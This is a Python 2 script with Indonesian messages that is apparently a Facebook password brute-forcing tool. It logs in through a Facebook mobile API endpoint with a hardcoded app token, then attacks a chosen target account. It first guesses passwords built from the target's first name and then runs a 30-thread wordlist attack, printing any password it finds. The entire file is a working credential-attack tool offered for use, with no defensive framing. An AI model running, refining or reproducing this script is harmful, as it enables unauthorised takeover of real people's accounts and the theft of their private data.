import os
import sys
import time
import json
import urllib
import requests
import threading

threads = []

def login():
    
    try:
        token = open("token.txt", "r")
    
    except IOError:
        print " Login FB...."
        user = raw_input(" Username: ")
        password = raw_input(" Password: ")
        url = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        dev = url.content
        jsl = json.loads(dev)
        if "session_key" in dev:
            print " Login Sukses...."
            open("token.txt", "w").write(jsl["access_token"])
            brute()
        elif "www.facebook.com" in jsl["error_msg"]:
            print " Akun Kena Cekpoint"
            os.system("rm -f token.txt")
            sys.exit()

        else:
            print " Gagal Login..."

def sup():
    try:
        for iqbal in range(30):
            ival = threading.Thread(target=multi, args=())
            ival.start()
            threads.append(ival)
        
        for ival in threads:
            ival.join()
    except IOError:
        print " Tidak ada Wordlist"

def multi():

    word1 = open("word.txt", "r")
    while word1:
        word = word1.readline().strip()
        log = ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + word + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        dev = urllib.urlopen(log)
        js = json.load(dev)
        if "access_token" in js:
            print " Found: " + word
            sys.exit()
        elif "www.facebook.com" in js["error_msg"]:
            print " cekpoint" + word
        else:
            print " mencoba ==> " + word 

def brute():
    try:
        token = open("token.txt", "r").read()

    except IOError:
        print " Tidak Ada Token"
        os.system("rm -f token.txt")
        sys.exit()

    else:
        
        target = raw_input(" Masukkan ID Target: ")
        iqbal = requests.get("https://graph.facebook.com/" + target + "?access_token=" + token)
        jsl = json.loads(iqbal.text)
        sandi1 = jsl["first_name"] + "123"
        log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        js = json.load(log)
        if "access_token" in js:
            print " User ID: " + target
            print " Password Found: " + sandi1
        elif "www.facebook.com" in js["error_msg"]:
            print " akun Cekpoint." + sandi1
        
        else:
            sandi2 = jsl["first_name"] + "12345" 
            log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            js = json.load(log)
            if "access_token" in js:
                print " Password Found: " + sandi2
            elif "www.facebook.com" in js["error_msg"]:
                print " Akun Cekpoint" + sandi2
            else:
                sandi3 = "sayang" 
                log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                js = json.load(log)
                if "access_token" in js:
                    print " Password Found: " + sandi3
                elif "www.facebook.com" in js["error_msg"]:
                    print " Akun Cekpoint" + sandi3
                else:
                    sup()
                   
login()
brute()
